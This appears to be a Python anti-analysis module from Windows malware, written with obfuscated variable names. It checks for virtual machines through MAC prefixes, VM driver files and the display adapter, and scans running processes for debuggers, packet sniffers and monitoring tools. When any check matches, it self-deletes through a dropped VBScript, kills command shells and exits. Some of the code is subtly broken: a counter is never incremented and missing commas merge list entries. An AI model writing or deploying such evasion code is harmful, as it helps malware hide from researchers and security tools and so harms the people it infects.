import os as obscenity
import wmi as worms
import time as termination
import uuid as umbra
import psutil as power
import fnmatch as flickering
import win32process as axolotl

ascend = 0
c = worms.WMI()

reacher = [
    ("00:50:56", "00:00:00", "FF:FF:FF"),
    ("00:0C:29", "00:00:00", "FF:FF:FF"),
    ("00:05:69", "00:00:00", "FF:FF:FF"),
    ("00:1C:14", "00:00:00", "FF:FF:FF"),
    ("00:50:56", "80:00:00", "BF:FF:FF"),
    ("00:16:3E", "00:00:00", "FF:FF:FF"),
    ("00:1D:D8", "00:00:00", "FF:FF:FF"),
    ("00:03:FF", "00:00:00", "FF:FF:FF"),
    ("00:18:51", "00:00:00", "FF:FF:FF"),
    ("58:9C:FC", "00:00:00", "FF:FF:FF"),
    ("50:6B:8D", "00:00:00", "FF:FF:FF"),
    ("54:52:00", "00:00:00", "FF:FF:FF"),
    ("54:52:FF", "00:00:00", "FF:FF:FF"),
    ("96:00:00", "00:00:00", "FF:FF:FF"),
    ("96:00:FF", "00:00:00", "FF:FF:FF")
]

def macintosh(hackintosh):
    hackintosh = hackintosh.replace(":", "").replace("-", "")
    return int(hackintosh, 16)

def octopod(hackintosh, pre, start, end):
    macintosh_int = macintosh(hackintosh)
    pre_int = macintosh(pre + ":00:00:00")

    start_int = macintosh(pre + ":" + start)
    end_int = macintosh(pre + ":" + end)

    return start_int <= macintosh_int <= end_int

def committing():
    try:
        mainbuff = "C:\\Users\\Public\\envCheck.exe"
        ambition = f"{obscenity.environ['TEMP']}\\c.vbs"
        bats = f"""
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")

WScript.Sleep 4000

Dim mainbuff
mainbuff = "{mainbuff}"

If fso.FileExists(mainbuff) Then
    fso.DeleteFile mainbuff
End If

Set fso = Nothing
"""
        with open(ambition, "w") as felony:
            felony.write(bats)
        obscenity.system(f"start /B /MIN cscript //nologo {ambition}")
        exit()
    except Exception as e:
        print(e)
        pass
    commits = [ "conhost", "cmd", "powershell" ]
    for commit in commits:
        proxies = [(p.pid, p.name()) for p in power.process_iter()]
        filtered_proxies = [p for p in proxies if p[1].startswith(commit)]

        for permutate, _ in filtered_proxies:
            try:
                axolotl.TerminateProcess(permutate, 0)
            except Exception as e:
                obscenity.system(f"taskkill /f /im {permutate}")

start = "00:00:00"
end = "FF:FF:FF"
raw = umbra.getnode()
addictive = ':'.join(['{:02x}'.format((raw >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])


federal = [
    "C:\\windows\\system32\\vmGuestLib.dll",
    "C:\\windows\\system32\\vm3dgl.dll",
    "C:\\windows\\system32\\vboxhook.dll",
    "C:\\windows\\system32\\vboxmrxnp.dll",
    "C:\\windows\\system32\\vmsrvc.dll",
    "C:\\windows\\system32\\drivers\\vmsrvc.sys",
    "C:\\windows\\system32\\drivers\\KsDumperDriver.sys",
    "C:\\program files (x86)\httpdebuggerpro\httpdebuggersvc.exe",
    ]

procedural = [
    "vmtoolsd.exe",
    "vmwaretray.exe"
    "vmwareuser.exe",
    "vmwaretray.exe",
    "vgauthservice.exe",
    "vmacthlp.exe",

    "vboxservice.exe",
    "vboxtray.exe",

    "prl_cc.exe"
    "prl_tools.exe",
    "xenservice.exe",
    "qemu-ga.exe",
    "joeboxcontrol.exe",
    "joeboxserver.exe",
    
    "fakenet.exe",
    "dumpcap.exe",
    "httpdebuggerui.exe",
    "httpdebuggerpro.exe",
    "wireshark.exe",
    "fiddler.exe",
    "fiddler everywhere.exe",
    "progress telerik fiddler web debugger.exe",
    "dumpcap.exe",
    "charles.exe",
    "burpsuitepro.exe",
    "burpsuite.exe",
    "burpsuitecommunity.exe",
    "mitmweb.exe",
    "mitmproxy.exe",
    "mitmdump.exe",
    "insomnia.exe",
    "http toolkit.exe",
    "postman.exe",
    "reqable.exe",
    "echo mirage.exe",

    "x32dbg.exe",
    "x64dbg.exe",
    "x96dbg.exe",
    "ida32.exe",
    "ida64.exe",
    "ollydbg.exe",
    "pestudio.exe",
    "binaryninja.exe",
    "cheat engine.exe",
    "cheatengine-i386.exe",
    "cheatengine-x86_64.exe",
    "cheatengine-x86_64-sse4-avx2.exe",
    "nopde engine.exe",
    "nopdeengine-i386.exe",
    "nopdeengine-x86_64.exe",
    "nopdeengine-x86_64-sse4-avx2.exe",

    "ksdumperclient.exe",
    "ksdumper.exe",
    "ksdumper11.exe",
    "kdu.exe",
    
    "df5serv.exe",

    "sysmon.exe",
    "sysmon64.exe",
    "procmon.exe",
    "procmon64.exe",
    "procexp.exe",
    "procexp64.exe",
    "systeminformer.exe",
    "processhacker.exe",
    
]

dosing = obscenity.listdir("C:\\windows\\system32\\drivers\\")
biblical = "PROCMON*.sys"
spiritual = "PROCEXP*.sys"

creativity = power.Process(4)
humanized = termination.strftime("%Y-%m-%d %H:%M:%S", termination.localtime(creativity.create_time()))
voices = c.Win32_VideoController()[0]



for fluxating in dosing:
    if flickering.fnmatch(fluxating, biblical) or flickering.fnmatch(fluxating, spiritual):
        committing()
        exit()

if humanized == "1970-01-01 00:00:00":
    ascend + 1

if voices.Name == "PNVURV":
    ascend + 1

if voices.Name == "Microsoft Basic Display Adapter":
    committing()
    exit()

if voices.InstalledDisplayDrivers == None:
    committing()
    exit()

if ascend >= 2:
    committing()
    exit()

for positional in power.process_iter(['pid', 'name']):
    if positional.info['name'].lower() in procedural:
        committing()
        exit()

for stairway in federal:
    if obscenity.path.exists(stairway):
        committing()
        exit()

for pre, start, end in reacher:
    if octopod(addictive, pre, start, end):
        committing()
        exit()
